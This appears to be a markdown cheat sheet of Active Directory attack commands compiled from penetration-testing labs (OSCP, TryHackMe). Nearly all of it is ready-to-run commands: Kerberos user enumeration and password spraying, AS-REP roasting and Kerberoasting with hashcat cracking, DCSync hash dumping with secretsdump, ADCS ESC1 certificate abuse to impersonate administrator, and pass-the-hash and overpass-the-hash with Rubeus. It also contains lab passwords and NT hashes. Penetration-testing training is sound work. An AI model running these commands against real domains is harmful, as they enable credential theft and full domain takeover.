# 🛠️ Tools Reference

Individual tool usage guides — each built from real lab usage.

---

## Index

| Tool | Purpose |
|------|---------|
| [Kerbrute](#kerbrute) | Username enum, password spray via Kerberos |
| [impacket-GetNPUsers](#impacket-getnpusers) | AS-REP Roasting |
| [impacket-GetUserSPNs](#impacket-getuserspns) | Kerberoasting |
| [impacket-secretsdump](#impacket-secretsdump) | Hash dumping / DCSync |
| [impacket-lookupsid](#impacket-lookupsid) | SID / RID bruteforce → user list |
| [impacket-smbserver](#impacket-smbserver) | SMB file server for transfers |
| [BloodHound CE](#bloodhound-ce) | AD graph analysis — path to DA |
| [Certipy-AD](#certipy-ad) | ADCS vulnerability enum and exploitation |
| [Rubeus](#rubeus) | Kerberos attack toolkit (Windows) |
| [ldapdomaindump](#ldapdomaindump) | LDAP dump → HTML-viewable output |

---

## Kerbrute

```bash
# Source
https://github.com/ropnop/kerbrute

# Copy to working directory
cp /home/kali/Arsenal/ActiveDirectory/Kerbrute/kerbrute .

# Username wordlist for AD
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt

# Username enumeration
sudo ./kerbrute userenum ./User.txt --dc $ip -d $domain
sudo ./kerbrute userenum usernamelist --dc $ip -d $domain
sudo ./kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --dc $ip -d $domain | tee enum/raw-kerbrute.txt

# Password spray (check lockout policy first)
sudo ./kerbrute passwordspray -d $domain enum/users.txt Password123 --dc $ip

# Extract valid usernames from output
grep "VALID USERNAME" enum/raw-kerbrute.txt | awk -F'@' '{print $1}' | awk '{print $NF}' > enum/users.txt
cat enum/raw-kerbrute.txt | cut -d "@" -f 1 | cut -d " " -f 14 >> enum/users.txt
```

---

## impacket-GetNPUsers

AS-REP Roasting — targets accounts with DontReqPreAuth set.

```bash
# Single user (no creds)
sudo impacket-GetNPUsers $domain/vcreed -dc-ip $ip -no-pass
sudo impacket-GetNPUsers $domain/ -dc-ip $ip
sudo impacket-GetNPUsers $domain/ -dc-ip $ip -request

# Username list (no creds)
sudo impacket-GetNPUsers $domain/ \
  -usersfile enum/users.txt \
  -format hashcat \
  -outputfile creds/asrep-hashes.txt \
  -dc-ip $ip

# With creds (auto-discover accounts)
sudo impacket-GetNPUsers $domain/$user:$pass \
  -request -dc-ip $ip \
  -format hashcat \
  -outputfile creds/asrep-hashes.txt

# NOTE: Insert 23 → $krb5asrep$23$ after $krb5asrep$ before cracking

# Crack
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
sudo john --wordlist=/usr/share/wordlists/rockyou.txt creds/asrep-hashes.txt
```

---

## impacket-GetUserSPNs

Kerberoasting — targets accounts with SPNs set.

```bash
# With creds — request TGS hashes
sudo impacket-GetUserSPNs $domain/$user:$pass \
  -dc-ip $ip -request \
  -outputfile creds/kerb-hashes.txt

# With hash
sudo impacket-GetUserSPNs $domain/$user \
  -hashes :NTHASH -dc-ip $ip -request

# No creds (Kerberos-only)
sudo impacket-GetUserSPNs $domain/ -k -no-pass -dc-ip $ip -request

# Crack TGS-REP hash
sudo hashcat -m 13100 creds/kerb-hashes.txt /usr/share/wordlists/rockyou.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt creds/kerb-hashes.txt
```

---

## impacket-secretsdump

Hash dumping — SAM, LSA, NTDS, DCSync.

```bash
# Remote — with creds
sudo impacket-secretsdump $domain/$user:$pass@$ip

# Remote — with hash
sudo impacket-secretsdump $domain/$user@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

# Just NTLM hashes (faster)
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-ntlm

# Specific account (e.g. krbtgt for Golden Ticket)
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-user krbtgt

# Local — from exported SAM/SYSTEM files
sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# No-pass (ZeroLogon post-exploit)
sudo impacket-secretsdump -no-pass -just-dc 'OSCP-EXAM$@$ip'
```

---

## impacket-lookupsid

SID / RID bruteforce → enumerate domain users without credentials.

```bash
# No creds (anonymous)
sudo impacket-lookupsid ''@$ip

# With creds
sudo impacket-lookupsid $domain/$user:$pass@$ip

# Get Domain SID (for Golden/Silver Ticket)
sudo impacket-lookupsid $domain/$user:$pass@$ip | grep -i "domain sid"
```

---

## impacket-smbserver

Host a temporary SMB share for file transfer to/from Windows targets.

```bash
# Basic SMB server
sudo impacket-smbserver kali .

# With SMB2 support (required for modern Windows)
sudo impacket-smbserver -smb2support kali .

# With credentials (bypass guest/anonymous restrictions)
sudo impacket-smbserver -smb2support -user test -pass '' kali .
# Verify from target:
net use \\KALI_IP\share /USER:test

# With named credentials
sudo impacket-smbserver -smb2support -username thm-unpriv -password Password321 kali .

# Download from target (Windows)
copy \\KALI_IP\kali\tool.exe C:\Windows\Tasks\tool.exe
```

---

## BloodHound CE

AD attack path analysis — maps shortest paths to Domain Admin.

```bash
# Start BloodHound CE (Docker)
cd /home/kali/Arsenal/ActiveDirectory/BloodHoundCE
sudo docker-compose up -d
sudo docker ps

# Get initial admin password from logs
sudo docker logs bloodhoundce-bloodhound-1 | grep -i pass
# Login: http://localhost:8080  →  admin / (password from logs) → reset on first login

# Stop BloodHound CE
sudo docker-compose down

# Collect data — netexec method (from Kali)
sudo nxc ldap $ip -u $user -p $pass --bloodhound --collection All --dns-server $ip

# SharpHound.exe (on Windows target)
SharpHound.exe -c All
SharpHound.exe -c All --output-directory C:\Windows\Tasks\

# SharpHound.ps1
Import-Module .\SharpHound.ps1
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\

# Import zip → http://localhost:8080 → Upload Files

# Key queries after import:
# Shortest Paths to Domain Admins from Owned
# Find Principals with DCSync Rights
# Find AS-REP Roastable Users (DontReqPreAuth)
# Find Kerberoastable Users
# Computers where Domain Users are Local Admin

# Icon reference:
# ORANGE = OU
# PURPLE = GPO Policy
```

---

## Certipy-AD

ADCS vulnerability enumeration and exploitation.

```bash
# Reference
https://github.com/ly4k/Certipy/wiki/06-Privilege-Escalation

# Find vulnerable templates — print to terminal
sudo certipy-ad find -u $user@$domain -p $pass -dc-ip $ip -vulnerable -stdout

# Save to file
sudo certipy-ad find -u $user@$domain -p $pass -dc-ip $ip \
  -vulnerable -text -output certs/certipy.txt

# Check enrollment rights
cat -n certs/certipy.txt | grep -iC4 'enrollment rights' | \
  grep -iE 'Enterprise Admins|Domain Admins|Domain Controllers'

# What you need from output:
# - CA Name     → e.g. thm-LABYRINTH-CA
# - DNS Name    → e.g. labyrinth.thm.local
# - Template    → e.g. ServerAuth

# Request certificate as administrator (ESC1)
sudo certipy-ad req \
  -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' \
  -dc-ip $ip \
  -target 'labyrinth.thm.local' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@thm.local'

# Authenticate with cert → get NTLM hash
sudo certipy-ad auth -pfx 'administrator.pfx' -dc-ip $ip
sudo certipy-ad auth -pfx 'bradley_ortiz.pfx' -dc-ip $ip

# Pass-the-Hash with obtained hash
sudo impacket-psexec BRADLEY_ORTIZ@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d

# Fix clock skew errors
rdate -n $ip
sudo ntpdate $ip
```

---

## Rubeus

Windows-based Kerberos attack toolkit.

```bash
# AS-REP Roasting
C:\Windows\Tasks> .\Rubeus.exe asreproast
# Transfer hash → insert $krb5asrep$23$ after $krb5asrep$
# Remove whitespace:
cat rawhash.txt | tr -d " \t\n\r" > asrep-hashes.txt
# Crack:
hashcat -m 18200 asrep-hashes.txt rockyou.txt

# Kerberoasting
C:\Windows\Tasks> .\Rubeus.exe kerberoast
# Remove whitespace:
cat rawhash.txt | tr -d " \t\n\r" > kerb-hashes.txt
# Crack:
hashcat -m 13100 -a 0 kerb-hashes.txt rockyou.txt

# Harvest TGTs every 30 seconds
C:\Windows\Tasks> .\Rubeus.exe harvest /interval:30

# Password spray via Kerberos
echo $ip CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
C:\Windows\Tasks> .\Rubeus.exe brute /password:Password1 /noticket

# Overpass-the-Hash → import TGT into session
C:\Windows\Tasks> .\Rubeus.exe asktgt \
  /domain:OSCP.EXAM \
  /user:administrator \
  /rc4:5b38382017f8c0ac215895d5f9aacac4 /ptt

# Verify ticket was imported
C:\Windows\Tasks> .\Rubeus.exe klist

# Access DC after ticket import
C:\Windows\Tasks> dir \\DC01\C$
PS C:\Windows\Tasks> Enter-PSSession -ComputerName DC01
```

---

## ldapdomaindump

LDAP dump → HTML files viewable in Firefox.

```bash
# Create output folder first (generates multiple files)
mkdir -p enum/ldap/

# Dump with LDAPS
sudo ldapdomaindump ldaps://$ip \
  -u "$domain\\$user" -p "$pass" \
  -o enum/ldap/

# Dump with LDAP
sudo ldapdomaindump $ip \
  -u "$domain\\$user" -p "$pass" \
  -o enum/ldap/

# View in browser
firefox enum/ldap/domain_users.html
firefox enum/ldap/domain_computers.html
firefox enum/ldap/domain_groups.html
firefox enum/ldap/domain_policy.html

# Grep descriptions for credentials
grep -i "description" enum/ldap/domain_users.grep | grep -v "^$"
```

---

[← Back to Main](../README.md)
